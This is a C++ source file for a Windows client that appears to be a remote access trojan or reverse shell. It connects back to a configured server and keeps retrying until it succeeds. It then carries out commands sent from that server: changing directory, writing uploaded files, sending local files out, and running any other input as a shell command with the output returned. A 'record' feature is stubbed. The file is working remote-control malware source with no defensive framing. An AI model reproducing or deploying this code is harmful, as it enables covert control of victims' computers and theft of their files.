#include "Client.hpp"
#include <direct.h>
#include <string.h>
#include <stdio.h>

Client::Client(const char* ip_addr, uint16_t port)
{
    this->port = port;
    this->server_ip = ip_addr;
    this->client_sock = create_sock();
    memset(this->buff_recv, 0, BUFF_SIZE);
    memset(this->buff_send, 0, BUFF_SIZE);
}

void Client::handle_client()
{
    char** tokens = split_str(this->buff_recv, ' '); 
    printf("Command:%s\n", buff_recv);
    for(int i = 0; tokens[i] != NULL; i++)
    {
        printf("Tokens: %s\n", tokens[i]);
    }
    

    if(strcmp(tokens[0], "cd") == 0)
    {
        printf("The cd is active, PATH:%s", tokens[1]);
        this->change_dir(tokens[1]);
    }
    else if(strcmp(tokens[0], "record") == 0)
    {
        this->start_recording();
    }
    else if(strcmp(tokens[0], "upload") == 0)
    {
        this->upload_file(tokens[1]);
    }
    else if(strcmp(tokens[0], "download") == 0)
    {
        this->download_file(tokens[1]);
    }
    else
    {
        this->execute_script(this->buff_recv);
    }
    free_tokens(tokens);
}

void Client::establish_connection()
{
    while(connect_to_addr(this->client_sock, this->server_ip, this->port) == SOCKET_ERROR);
    printf("Connection Established!\n");
    int c;
    while(true)
    {
        c = recv(this->client_sock, this->buff_recv, BUFF_SIZE, 0);
        buff_recv[c] = '\0';
        
        this->handle_client();
    }
}

void Client::change_dir(char* path)
{
    if(_chdir(path) == 0)
    {
        strcpy(this->buff_send, "Directory changed!\n");        
    }
    else
    {
        strcpy(this->buff_send, "Invalid path!\n");
    }
    send(this->client_sock, this->buff_send, strlen(this->buff_send), 0);
    return;
}

void Client::download_file(const char* filename)
{
    FILE* file = fopen(filename, "rb");
    uint32_t file_size = get_file_size(file);
    send(this->client_sock, (const char*)&file_size, sizeof(file_size), 0);
    int sum = 0, c;
    while(sum < file_size)
    {
        c = fread(this->buff_send, sizeof(char), BUFF_SIZE, file);
        c = send(this->client_sock, this->buff_send, c, 0);
        sum += c;
    }
    fclose(file);
}

void Client::upload_file(const char* filename)
{
    FILE* file = fopen(filename, "wb");
    uint32_t file_size;
    recv(this->client_sock, (char*)&file_size, sizeof(file_size), 0);
    int b_size = BUFF_SIZE, c;
    while(file_size > 0)
    {
        if(file_size <= BUFF_SIZE) b_size = file_size;
        c = recv(this->client_sock, this->buff_recv, b_size, 0);
        fwrite(this->buff_recv, sizeof(char), c, file);
        file_size -= c;
    } 
    fclose(file);
}

void Client::start_recording()
{

}

void Client::execute_script(char* cmd)
{
    int c = execute_proc(cmd, this->buff_send, this->client_sock);
}